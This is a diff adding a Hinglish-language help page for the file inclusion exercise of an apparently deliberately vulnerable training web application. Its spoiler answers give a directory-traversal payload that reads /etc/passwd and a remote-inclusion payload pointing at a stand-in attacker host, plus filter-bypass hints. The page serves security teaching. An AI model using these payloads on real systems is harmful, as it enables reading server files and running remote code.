@@ -1,0 +1,66 @@
+<div class="body_padded">
+	<h1>Help - File Inclusion</h1>
+
+	<div id="code">
+	<table width='100%' bgcolor='white' style="border:2px #C0C0C0 solid">
+	<tr>
+	<td><div id="code">
+		<h3>Parichay (About)</h3>
+		<p>Kuch web applications user ko aisa input dene ki permission deti hain jo seedha file streams mein use hota hai ya user ko server par files upload karne deta hai.
+			Kuch time baad web application web application ke context mein hi user ke diye gaye input ko access karti hai. Aisa karke, web application
+			malicious file execution ka potential allow kar rahi hoti hai.</p>
+
+		<p>Agar jo file include karne ke liye chuni gayi hai woh target machine par local hai, toh ise "Local File Inclusion (LFI)" kehte hain. Par files doosri
+			machines par bhi include ki ja sakti hain, us case mein attack "Remote File Inclusion (RFI)" ban jata hai.</p>
+
+		<p>Jab RFI ka option na ho, toh LFI ke sath koi doosri vulnerability (jaise file upload aur directory traversal) use karke aksar same effect achieve kiya ja sakta hai.</p>
+
+		<p>Note karein, "file inclusion" term ka matlab "arbitrary file access" ya "file disclosure" nahi hota.</p>
+
+		<br /><hr /><br />
+
+		<h3>Objective (lakshya)</h3>
+		<p>Sirf file inclusion ka use karke '<a href="../hackable/flags/fi.php">../hackable/flags/fi.php</a>' se saare <u>paanch</u> famous quotes read karein.</p>
+
+		<br /><hr /><br />
+
+		<h3>Low Level</h3>
+		<p>Yeh <u>kai PHP functions mein se ek</u> ke andar direct input allow karta hai jo execute hote time content ko include kar lega.</p>
+
+		<p>Web service ki configuration par depend karega ki RFI hona possible hai ya nahi.</p>
+		<pre>Spoiler (jawab): <span class="spoiler">LFI: ?page=../../../../../../etc/passwd</span>.
+			Spoiler (jawab): <span class="spoiler">RFI: ?page=http://www.evilsite.com/evil.php</span>.</pre>
+
+		<br />
+
+		<h3>Medium Level</h3>
+		<p>Developer ne LFI/RFI ki kuch problems ke baare mein padh liya hai, aur input ko filter karne ka faisla kiya hai. Halanki, jo patterns use kiye gaye hain, woh sifficient nahi hain.</p>
+		<pre>Spoiler (jawab): <span class="spoiler">LFI: Possible, due to it only cycling through the pattern matching once</span>.
+			Spoiler (jawab): <span class="spoiler">RFI: <a href="https://secure.php.net/manual/en/wrappers.php" target="_blank">PHP Streams</a></span>.</pre>
+
+		<br />
+
+		<h3>High Level</h3>
+		<p>Developer tang aa chuka hai. Unhone sirf kuch specific files ko hi use karne dene ka faisla kiya hai. Halanki kyunki same basename wali multiple files hain,
+			isliye woh sabhi ko include karne ke liye wildcard use karte hain.</p>
+		<pre>Spoiler (jawab): <span class="spoiler">LFI: The filename only has start with a certain value.</span>.
+			Spoiler (jawab): <span class="spoiler">RFI: Need to link in another vulnerability, such as file upload</span>.</pre>
+
+		<br />
+
+		<h3>Impossible Level</h3>
+		<p>Developer haar maan leta hai aur exact filenames ke sath sirf allowed pages ko hardcode kar deta hai. Aisa karke, woh attack ke saare raaste band kar deta hai.</p>
+	</div></td>
+	</tr>
+	</table>
+
+	</div>
+
+	<br />
+
+	<p>Reference: <a href="https://en.wikipedia.org/wiki/Remote_File_Inclusion" target="_blank">Wikipedia - File inclusion vulnerability</a></p>
+	<p>Reference: <a href="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion" target="_blank">WSTG - Local File Inclusion</a></p>
+	<p>Reference: <a href="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion" target="_blank">WSTG - Remote File Inclusion</a></p>
+	<p>Reference: <a href="https://owasp.org/www-community/vulnerabilities/PHP_File_Inclusion" target="_blank">PHP File Inclusion</a></p>
+
+</div>
